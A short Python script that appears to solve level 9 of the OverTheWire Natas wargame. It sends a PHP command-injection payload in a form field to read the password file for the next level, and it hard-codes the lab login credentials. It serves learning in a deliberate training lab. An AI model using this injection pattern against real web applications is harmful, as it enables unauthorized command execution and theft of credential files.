#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re

username = 'natas9'
password = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'

url = 'http://%s.natas.labs.overthewire.org/' % username

# response = requests.get(url, auth=(username, password))
response = requests.post(url, data={
                         'needle': '. /etc/natas_webpass/natas10; #', 'submit': 'submit'}, auth=(username, password))
content = response.text

print(content)
print(re.findall('<pre>\n(.*)\n</pre>', content))

# PHP Command Injection